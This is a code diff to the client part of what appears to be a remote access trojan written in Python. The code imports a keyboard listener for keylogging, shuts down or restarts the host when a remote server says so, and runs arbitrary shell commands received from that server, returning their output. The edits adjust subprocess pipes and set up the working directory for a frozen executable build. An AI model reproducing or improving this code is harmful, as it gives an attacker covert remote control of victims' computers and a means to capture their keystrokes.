@@ -21,11 +21,18 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
+if getattr(sys, 'frozen', False):
+    CLIENT_PATH = os.path.dirname(sys.executable)
+    os.chdir(CLIENT_PATH)
+elif __file__:
+    CLIENT_PATH = os.path.dirname(__file__)
+    os.chdir(CLIENT_PATH)
+
 if platform.system() == 'Windows':
     import ctypes
-    LOG = os.path.join(sys.path[0] + '\\log.log')
+    LOG = os.path.join(CLIENT_PATH + '\\log.log')
 else:
-    LOG = os.path.join(sys.path[0] + '/log.log')
+    LOG = os.path.join(CLIENT_PATH + '/log.log')
 
 try:
     from pynput.keyboard import Listener
@@ -383,17 +390,17 @@ class Client(object):
 
             if data[0] == 'SHUTDOWN':
                 if platform.system() == 'Windows':
-                    subprocess.Popen('shutdown /s /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 else:
-                    subprocess.Popen('shutdown -h now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    subprocess.Popen('shutdown -h now', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 time.sleep(5)
                 break
 
             if data[0] == 'RESTART':
                 if platform.system() == 'Windows':
-                    subprocess.Popen('shutdown /r /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 else:
-                    subprocess.Popen('reboot now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    subprocess.Popen('reboot now', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 time.sleep(5)
                 break
 
@@ -490,13 +497,13 @@ class Client(object):
                     continue
 
                 if data[1][:2].lower() == 'cd' or data[1][:5].lower() == 'chdir':
-                    process = subprocess.Popen(data[1] + self._pwd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    process = subprocess.Popen(data[1] + self._pwd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     error = process.stderr.read().decode()
                     if error == "":
                         output = process.stdout.read().decode()
                         newlines = output.count('\n')
                         if newlines > 1:
-                            process = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                             self.send(json.dumps(['ERROR', process.stdout.read().decode()]).encode())
                         else:
                             os.chdir(output.replace('\n', '').replace('\r', ''))
@@ -508,7 +515,7 @@ class Client(object):
                 if len(data[1]) > 0:
                     if data[1] == 'tree':
                         data[1] = 'tree /A'
-                    process = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     for line in iter(process.stdout.readline, ""):
                         if line == b'':
                             break
